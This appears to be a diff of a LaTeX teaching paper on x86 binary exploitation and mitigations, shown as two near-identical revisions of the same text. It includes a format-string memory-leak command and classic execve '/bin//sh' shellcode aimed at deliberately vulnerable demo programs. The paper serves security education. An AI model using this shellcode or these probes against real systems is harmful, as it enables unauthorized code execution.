Exploitation Techniques and Mitigations

### 2016-01-17 docs/paper.tex
Move things around with templating foo

\newminted{nasm}{fontsize=\scriptsize,frame=leftline,framesep=2mm,linenos}

@@

We highly recommend checking them out and having a look at their material for
further details.

@@

Exploiting binaries was comparatively easy in the early days of computing.
Usually there were no special mitigation techniques in place trying to prevent
even the most simplest exploits. This is the point in time where we will start
of. First we talk about two very simple exploits, namely the Format String
Exploit and the Buffer Overflow in combination with Shell Code. Note that there
is a huge collection of exploitation techniques known to the public and we will
thereby only look at a very small fraction of them.

But before we can introduce these two exploits, some background knowledge is
required. This will be handled by the next section, which provides a short
overview of the relevant components in our target architecture, the x86
platform.

After that both techniques are introduced to the reader, followed by the first
mitigation technique, Data Execution Prevention (DEP). From there on we will
keep on using the buffer overflow technique with some adaptations to circumvent
DEP. At this point Return Oriented Programming (ROP) is introduced.

This directly leads to Address Space Layout Randomization (ASLR) the next
mitigation mechanism we will discuss. Again the buffer overflow technique can
be adapted to break ASLR through the use of additional information.

Since neither DEP nor ASLR provide significant protection against even this
simple technique, an additional mitigation is put into place in the form of
Stack Cookies.

Examples will be provided along the way to support the reader and provide some
additional explanation.

Control Flow Integrity (CFI), Heap Corruption and polymorphic code will follow
in a more compressed manner to communicate the main idea behind each of them.

Finally we will conclude with a word about other architectures (x86\_64 and
ARM) and a lookout that even languages considered secure have their own set of
exploitation techniques an attacker could leverage.

@@

Throughout this work we assume that we know the target binary (and the
libraries it uses). Let us show that this assumption is quite reasonable to
make by looking through the eyes of the adversary. An attacker who wants to
penetrate a target machine and get control over it would most likely choose the
easiest path, by exploiting the weakest link. Most machines relevant to an
attackers interest will run provide multiple services. For example, while the
main server of a small business company may run a homemade communication server
for interaction between them and their clients, it may also run a standard web
server. Sending a misspelled request to the server may lead following response:

\begin{pre*}{autogobble,xleftmargin=1cm}
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>400 Bad Request</title>
    </head><body>
    <h1>Bad Request</h1>
    <p>Your browser sent a request that this server could not understand.<br />
    </p>
    <hr>
    <address>Apache/2.2.22 (Ubuntu) Server at ovinnik.canonical.com Port 80</address>
    </body></html>
    Connection closed by foreign host.
\end{pre*}

The web server tells us his exact version and since it also provides
information about the operating system an attacker can easily copy the basic
setup to test and tweak his exploits.

@@

This section will teach necessary background knowledge about the target
platform to fully conceive the following techniques. But first let us elaborate
why x86 has been chosen in the first place.

At the time these techniques (and the related mitigations) were established,
x86 was the most common platform. Since most exploits easily translate over
from x86 to other architectures, especially x86\_64 which very common nowadays.
Also, most material found on the internet regarding this and related topics
cover x86.

More detailed explanations can be found on
Wikipedia\footnote{\url{https://en.wikipedia.org/wiki/X86}} or the Intel
Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}}.

@@

\Cref{fig:registers} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=X86&oldid=696308590\#/media/File:Table_of_x86_Registers_svg.svg}})
shows an overview of registers available on the x86 platform. While there are
dedicated registers for floating pointer operations and also special registers
which hardware protection (segment registers) we will only focus on nine most
commonly used registers.

\begin{minipage}[t]{0.5\textwidth}
    \begin{description}
        \item[\texttt{EAX}] Accumulator Register
        \item[\texttt{EBX}] Base Register
        \item[\texttt{ECX}] Counter Register
        \item[\texttt{EDX}] Data Register
        \item[\texttt{ESI}] Source Index
        \item[\texttt{EDI}] Destination Index
        \item[\texttt{EBP}] Base Pointer
        \item[\texttt{ESP}] Stack Pointer
        \item[\texttt{EIP}] Instruction Pointer
    \end{description}
\end{minipage}
\begin{minipage}[t]{0.45\textwidth}
    \begin{figure}[H]
        \includegraphics[width=\textwidth]{gfx/single_register.png}
        \caption{Addressing specific parts of a register including \SI{64}{\bit} extension}
        \label{fig:single_register}
    \end{figure}
\end{minipage}
\bigskip

The instruction pointer \texttt{EIP} points to the next instruction located in
memory which is going to be executed on the cycle. Stack pointer \texttt{ESP} and base
pointer \texttt{EBP} are used for stack management which is vital to call and
return from multiple functions properly. The remaining six registers are used
for computation and passing arguments for system calls. Their values can either
be interpreted as integers or pointers.

Note that these registers can be addressed partially allowing one to write only
to the lower \SI{16}{bit} for example as displayed in
\cref{fig:single_register} taken from \textit{null
programm}\footnote{\url{http://nullprogram.com/img/x86/register.png} on
December of 2015}.

The CPU comes with protection mechanisms which allows the operating system
kernel to limit the privileges of other processes. This mechanism is known as
\textit{protection rings} (Ring 0 -- Ring 3). The kernel runs \emph{in} Ring 0
(most privileged) and switches to Ring 3 (least privileged) when a normal
process is scheduled. A system call has to be made by the process if it needs
something which goes beyond its scope. The kernel takes over, deals with the
request and returns execution back to the process. This is known as
\textit{context switch} and switching between Rings happens along the way.

@@

As already mentioned in the previous paragraph, a process only has limited
capabilities and the kernel has to take over to fulfill certain (more
privileged) operations. The operating system's documentation tells you which
system calls are available (on which platform) and what additional parameters
they require. Let us illustrate this with an example: On x86 the Linux system
number 4 (starting from 0) is the \texttt{sys\_write} system call which writes
data to a file descriptor. It takes three arguments, the file descriptor to
write to, a pointer to the start of the data which should be written and the
length of the data. The number of the system call together with these three
parameters are placed in the \texttt{EAX}, \texttt{EBX}, \texttt{ECX},
\texttt{EDX} respectively. To invoke the system call issue following
instruction:

\begin{nasmcode*}{autogobble,xleftmargin=1cm,linenos=false}
    int     0x80
\end{nasmcode*}

Nowadays you may encounter a different mechanism for system calls, the Virtual
Dynamic Shared Objects (vDSO) mechanism. This goes beyond our scope here, we
will use the previously mentioned mechanism in our exploits. If interested, you
may want to look at the related man
page\footnote{\url{http://man7.org/linux/man-pages/man7/vdso.7.html}}.

@@

Physical memory is managed by the operation system kernel by utilising the
Memory Management Unit (MMU). Each process' address space is virtualized and
memory operations are translated on-the-fly by the MMU. The physical memory is
segmented into \textit{pages} (typically \SI{4}{\kibi\byte} in size) and each
page can be mapped into the virtual address space of one or more (shared)
processes.~\cite[pp.~400]{unix_interals}

The main parts located inside the (virtual) address space of a process are the
executable itself with its \texttt{.text} and \texttt{.data} section, the heap
used for dynamic data, the stack used for local variables and function calling
and used libraries.

@@

\begin{figure}[t]
    \centering
    \includegraphics[width=0.35\textwidth]{gfx/little_endian.pdf}
    \caption{Placement of bytes in memory in little-endian}
    \label{fig:little_endian}
\end{figure}

Endianness refers to the byte order used when storing data in memory (or
transmitting it over the network). \Cref{fig:little_endian} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=Endianness&oldid=696417697\#/media/File:Little-Endian.svg}})
illustrates that the least significant byte of a word is placed at the lower
memory address and successive bytes are placed as the memory address increases.

@@

A calling convention defines how function calls should be implemented. What
calling convention is used depends on the platform, toolchain and (compiler)
settings. Let us exhibit what the convention defines and what convention we are
using.

\begin{minipage}[t]{0.47\textwidth}
    Defines:
    \begin{itemize}
        \item Where to place arguments
        \item Where to place return value
        \item Where to place return address
        \item Who prepares the stack
        \item Who saves which register
        \item Who cleans up\\
            (caller or callee)
    \end{itemize}
\end{minipage}
\begin{minipage}[t]{0.47\textwidth}
    C Declaration (cdecl):
    \begin{itemize}
        \item Arguments on stack (reverse order)\\
            stack aligned to \SI{16}{\byte} boundary
        \item Return via register (\texttt{EAX} / \texttt{ST0})
        \item \texttt{EAX}, \texttt{ECX}, \texttt{EDX} saved by the caller\\
            rest saved by the callee
        \item On stack:\\
            old instruction pointer (\texttt{IP})\\
            old base pointer (\texttt{BP})
        \item Caller does the cleanup
    \end{itemize}
\end{minipage}

@@

\begin{listing}[h!]
    \begin{minipage}[t]{0.47\textwidth}
        \cfile{../format_string/main.c}
    \end{minipage}
    \begin{minipage}[t]{0.47\textwidth}
        \begin{pre*}{autogobble}
            > echo foobar | ./main
            You entered:
            foobar
        \end{pre*}
        \medskip
        \begin{pre*}{autogobble}
            > echo AAAABBBB | ./main
            correct
        \end{pre*}
        \medskip
        \begin{pre*} {autogobble}
            > echo '%08x' | ./main
            You entered:
            bfd98ed4
        \end{pre*}
    \end{minipage}
    \caption{Program vulnerable to Format String Exploits}
    \label{src:format_string_exploit}
\end{listing}

@@

\begin{pre*} {autogobble}
    > python -c 'print "%08x." * 10' | ./main
    bf920c14.00000064.b77de29e.00000000.00000000.b77fedf8.bf920d94.00000000.41414141.42424242.
\end{pre*}

@@

\begin{listing}[h!]
    \cfile{../overflow/overflow.c}
    \caption{Program vulnerable to buffer overflows}
    \label{src:buffer_overflow}
\end{listing}

@@

\begin{pre}
0804849b <mordor>:
 804849b:   55                      push   %ebp
 804849c:   89 e5                   mov    %esp,%ebp
 804849e:   83 ec 08                sub    $0x8,%esp
 80484a1:   83 ec 0c                sub    $0xc,%esp
 80484a4:   68 c0 85 04 08          push   $0x80485c0
 80484a9:   e8 b2 fe ff ff          call   8048360 <puts@plt>
 80484ae:   83 c4 10                add    $0x10,%esp
 80484b1:   90                      nop
 80484b2:   c9                      leave
 80484b3:   c3                      ret

080484b4 <echo>:
 80484b4:   55                      push   %ebp
 80484b5:   89 e5                   mov    %esp,%ebp
 80484b7:   83 ec 28                sub    $0x28,%esp
 80484ba:   c7 45 e4 00 00 00 00    movl   $0x0,-0x1c(%ebp)
 80484c1:   c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%ebp)
 80484c8:   c7 45 ec 00 00 00 00    movl   $0x0,-0x14(%ebp)
 80484cf:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
 80484d6:   c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
 80484dd:   83 ec 0c                sub    $0xc,%esp
 80484e0:   68 e8 85 04 08          push   $0x80485e8
 80484e5:   e8 76 fe ff ff          call   8048360 <puts@plt>
 80484ea:   83 c4 10                add    $0x10,%esp
 80484ed:   83 ec 08                sub    $0x8,%esp
 80484f0:   8d 45 e4                lea    -0x1c(%ebp),%eax
 80484f3:   50                      push   %eax
 80484f4:   68 f4 85 04 08          push   $0x80485f4
 80484f9:   e8 92 fe ff ff          call   8048390 <__isoc99_scanf@plt>
 80484fe:   83 c4 10                add    $0x10,%esp
 8048501:   83 ec 08                sub    $0x8,%esp
 8048504:   8d 45 e4                lea    -0x1c(%ebp),%eax
 8048507:   50                      push   %eax
 8048508:   68 f7 85 04 08          push   $0x80485f7
 804850d:   e8 3e fe ff ff          call   8048350 <printf@plt>
 8048512:   83 c4 10                add    $0x10,%esp
 8048515:   90                      nop
 8048516:   c9                      leave
 8048517:   c3                      ret
\end{pre}

@@

\begin{nasmcode*}{autogobble,xleftmargin=1em}
    xor     eax, eax    ;Clearing eax register
    push    eax         ;Pushing NULL bytes
    push    0x68732f2f  ;Pushing //sh
    push    0x6e69622f  ;Pushing /bin
    mov     ebx, esp    ;ebx now has address of /bin//sh
    push    eax         ;Pushing NULL byte
    mov     edx, esp    ;edx now has address of NULL byte
    push    ebx         ;Pushing address of /bin//sh
    mov     ecx, esp    ;ecx now has address of address
                        ;of /bin//sh byte
    mov     al, 11      ;syscall number of execve is 11
    int     0x80        ;Make the system call
\end{nasmcode*}

>>>>

\usepackage{wrapfig}
\newminted{nasm}{
    fontsize=\scriptsize,
    frame=leftline,
    framesep=2mm,
    autogobble,
    linenos}

@@

We highly recommend checking them out and having a look at their material for
further details apart from the given references.

@@

Exploiting binaries was comparatively easy ten to fifteen years ago. There were
no special mitigation mechanisms in place denying even the most simplest
exploits. This is the point in time where we will start of. First we talk about
two very simple exploits, namely the Format String Exploit and the Buffer
Overflow in combination with Shell Code. Although there is a huge collection of
exploitation techniques known to the public, we will only look at a very small
fraction of them in this project.

The next section will communicate necessary background knowledge required to
fully grasp the two presented exploits. A short overview about the target
architecture x86 will be given.

After that, both techniques are introduced, followed by the first mitigation
technique, Data Execution Prevention (DEP). From there on we will keep on using
the buffer overflow technique with some adaptations to circumvent DEP. At that
point Return Oriented Programming (ROP) is introduced, directly leads to
Address Space Layout Randomization (ASLR) the follow-up mitigation mechanism.
Again the buffer overflow technique can be adapted to break ASLR through the
use of additional information.

Since neither DEP nor ASLR provide significant protection against even this
simple technique, an additional mitigation has been put into place in the form
of Stack Cookies.

An outlook will be given after bypassing Stack Cookies by looking at Control
Flow Integrity (CFI).

Examples will be provided along the way support the reader and provide some
additional explanation. Finally we will conclude with a word about other
architectures (x86\_64 and ARM) followed by a recap about this project.

@@

Throughout this work we assume that we know the target binary (and the
libraries it uses). Let us show that this assumption is quite reasonable to
make by looking through the eyes of the adversary. An attacker who wants to
penetrate a target machine would most likely choose the easiest path, by
exploiting the weakest link. Most machines relevant to an attacker's interest
will provide multiple services. Consider following scenario:

The main server of a small business company runs a homemade communication
service for interaction between them and their clients. The attacker has no
access to the source or binary of this communication service's daemon running
on the target machine. But along with it a commonly used web server is
listening on port 80. Getting the source (and binary) of the web server is much
easier therefore an attacker would pick this entry point over the communication
service daemon.

\begin{listing}[h!]
    \begin{code*}{linenos=false}
        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>400 Bad Request</title>
        </head><body>
        <h1>Bad Request</h1>
        <p>Your browser sent a request that this server could not understand.<br />
        </p>
        <hr>
        <address>Apache/2.2.22 (Ubuntu) Server at ovinnik.canonical.com Port 80</address>
        </body></html>
        Connection closed by foreign host.
    \end{code*}
    \caption{A web server's response to a misspelled request}
    \label{src:http_response}
\end{listing}

\Cref{src:http_response} shows a possible response of a web server when
receiving an invalid request. The web server tells us his exact version and
since it also provides information about the operating system (distribution) an
attacker can easily mimic this setup to test and tweak his exploits. Exploits
may already be known to the public if the used version is not up-to-date. An
attacker could easily reuse them.

@@

This section will teach necessary background knowledge about the target
platform to fully conceive the following techniques. But first let us elaborate
why x86 has been chosen.

At the time these techniques (and their related mitigations) were established,
x86 was the most common platform. The majority of related material found on the
internet covers x86, and many exploitation techniques can be translated from
x86 to other architectures with ease.

A more detailed overview can be found on
Wikipedia\footnote{\url{https://en.wikipedia.org/wiki/X86}} and if this is not
enough for you, consider the Intel
Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}}
for a more profound insight.

@@

\Cref{fig:registers} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=X86&oldid=696308590\#/media/File:Table_of_x86_Registers_svg.svg}})
shows an overview of registers available on the x86 platform. While there are
dedicated registers for floating pointer operations and registers with hardware
protection (segment registers) we will only focus on nine commonly used
registers.

\begin{minipage}[t]{0.4\textwidth}
    \begin{description}
        \item[\texttt{EAX}] Accumulator Register
        \item[\texttt{EBX}] Base Register
        \item[\texttt{ECX}] Counter Register
        \item[\texttt{EDX}] Data Register
        \item[\texttt{ESI}] Source Index
        \item[\texttt{EDI}] Destination Index
        \item[\texttt{EBP}] Base Pointer
        \item[\texttt{ESP}] Stack Pointer
        \item[\texttt{EIP}] Instruction Pointer
    \end{description}
\end{minipage}
\begin{minipage}[t]{0.6\textwidth}
    \begin{figure}[H]
        \centering
        \includegraphics[width=0.8\textwidth]{gfx/single_register.png}
        \caption{Addressing specific parts of a register including \SI{64}{\bit} extension}
        \label{fig:single_register}
    \end{figure}
\end{minipage}
\bigskip

The instruction pointer \texttt{EIP} points to the next instruction in memory
which will be executed the subsequent cycle. Stack pointer \texttt{ESP} and
base pointer \texttt{EBP} are used for stack management which is vital to call
and return from multiple functions properly. The remaining six registers are
used for arithmetic and memory operations as well as passing arguments
(parameters) for system calls. Their values can either be interpreted as
integers or pointers.

Note that these registers can be addressed partially allowing one to write only
to the lower \SI{16}{bit}, for example, as displayed in
\cref{fig:single_register} taken from \textit{null
programm}\footnote{\url{http://nullprogram.com/img/x86/register.png} on
December of 2015}.

The CPU comes with protection mechanisms which allows the operating system
kernel to limit other processes' privileges. This mechanism is known as
\textit{protection rings} (Ring 0 -- Ring 3). The kernel runs \emph{in} Ring 0
(most privileged) and switches to Ring 3 (least privileged) when a normal
process is scheduled. A system call is invoked by the process if it needs
something beyond its scope. The kernel takes over, deals with the request and
returns execution back to the process. This is known as \textit{context switch}
and switching between Rings happens along with it.

@@

As already mentioned in the previous paragraph, a process only has limited
capabilities and the kernel has to take over to fulfill certain (more
privileged) operations. The operating system's documentation tells you which
system calls are available (on which platform) and what parameters
each of them requires. Let us illustrate this with an example: On x86 Linux the
system call
number 4 (starting from 0) is the \texttt{sys\_write} system call which writes
data to a file descriptor. It takes three arguments, the file descriptor to
write to, a pointer to the start of the data which should be written and the
length of the data. The number of the system call together with these three
parameters are placed in the \texttt{EAX}, \texttt{EBX}, \texttt{ECX},
\texttt{EDX} respectively. To invoke the system call issue following
instruction:

\begin{nasmcode*}{linenos=false}
    int     0x80
\end{nasmcode*}

Nowadays you may encounter a different mechanism for system calls using Virtual
Dynamic Shared Objects (vDSO). This goes beyond our scope here, we will use the
previously mentioned mechanism in our exploits as they work side by side.
Consult the corresponding man
page\footnote{\url{http://man7.org/linux/man-pages/man7/vdso.7.html}} for
further reading.

@@

Physical memory is managed by the operation system kernel by utilising the
Memory Management Unit (MMU). Each process' address space is virtualized and
memory operations are translated on-the-fly by the MMU. Physical memory is
segmented into \textit{pages} (typically \SI{4}{\kibi\byte} in size) and each
page can be mapped \emph{into} the virtual address space of one or more
(shared) processes.~\cite[pp.~400]{unix_interals}

The main parts located inside the (virtual) address space of a process are the
executable itself with its \texttt{.text} and \texttt{.data} section, the heap
(used for dynamic data), the stack (used for local variables and function
calling) and libraries.

@@

\begin{figure}[H]
    \centering
    \includegraphics[width=0.35\textwidth]{gfx/little_endian.pdf}
    \caption{Placement of bytes in memory in little-endian}
    \label{fig:little_endian}
\end{figure}

Endianness refers to the byte order used when storing data in memory (or
transmitting it over the network). x86 uses little-endian which is described in
\cref{fig:little_endian} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=Endianness&oldid=696417697\#/media/File:Little-Endian.svg}}).
The least significant byte of a word is placed at the lower memory address and
successive bytes are placed as the memory address increases. We will later
refer back to this when needed. The related Wikipedia
page\footnote{\url{https://en.wikipedia.org/wiki/Endianness}} goes into more
detail about this than we need.

@@

A calling convention defines how function calls should be implemented. What
calling convention is used depends on the platform, toolchain and compiler
settings. Let us exhibit what the convention defines and what convention we are
using (cdecl).

\begin{minipage}[t]{0.48\textwidth}
    Convention defines:
    \begin{itemize}
        \item Where to place arguments
        \item Where to place return value
        \item Where to place return address
        \item Who prepares the stack
        \item Who saves which register
        \item Who cleans up\\
            (caller or callee)
    \end{itemize}
\end{minipage}\hfill
\begin{minipage}[t]{0.48\textwidth}
    C Declaration (cdecl):
    \begin{itemize}
        \item Arguments on stack (reverse order)\\
            stack aligned to \SI{16}{\byte} boundary
        \item Return via register (\texttt{EAX} / \texttt{ST0})
        \item \texttt{EAX}, \texttt{ECX}, \texttt{EDX} saved by the caller\\
            rest saved by the callee
        \item On stack:\\
            old instruction pointer (\texttt{IP})\\
            old base pointer (\texttt{BP})
        \item Caller does the cleanup
    \end{itemize}
\end{minipage}

@@

\begin{listing}[h!]
    \begin{minipage}[t]{0.4\textwidth}
        \cfile{../format_string/main.c}
    \end{minipage}\hfill
    \begin{minipage}[t]{0.5\textwidth}
        \begin{code*}{linenos=false}
            > echo foobar | ./main
            You entered:
            foobar

            > echo AAAABBBB | ./main
            correct

            > echo '%08x' | ./main
            You entered:
            bfd98ed4
        \end{code*}
    \end{minipage}
    \caption{Program vulnerable to Format String Exploits}
    \label{src:format_string_exploit}
\end{listing}

@@

\begin{code*}{linenos=false}
    > python -c 'print "%08x." * 10' | ./main
    bf920c14.00000064.b77de29e.00000000.00000000.b77fedf8.bf920d94.00000000.41414141.42424242.
\end{code*}

@@

\begin{listing}[h!]
    \begin{minipage}[t]{0.4\textwidth}
        \cfile{../overflow/overflow.c}
    \end{minipage}\hfill
    \begin{minipage}[t]{0.5\textwidth}
        \codefile{../overflow/objdump.txt}
    \end{minipage}
    \caption{Program vulnerable to buffer overflows}
    \label{src:buffer_overflow}
\end{listing}

@@

@@

\begin{nasmcode}
    xor     eax, eax    ;Clearing eax register
    push    eax         ;Pushing NULL bytes
    push    0x68732f2f  ;Pushing //sh
    push    0x6e69622f  ;Pushing /bin
    mov     ebx, esp    ;ebx now has address of /bin//sh
    push    eax         ;Pushing NULL byte
    mov     edx, esp    ;edx now has address of NULL byte
    push    ebx         ;Pushing address of /bin//sh
    mov     ecx, esp    ;ecx now has address of address
                        ;of /bin//sh byte
    mov     al, 11      ;syscall number of execve is 11
    int     0x80        ;Make the system call
\end{nasmcode}
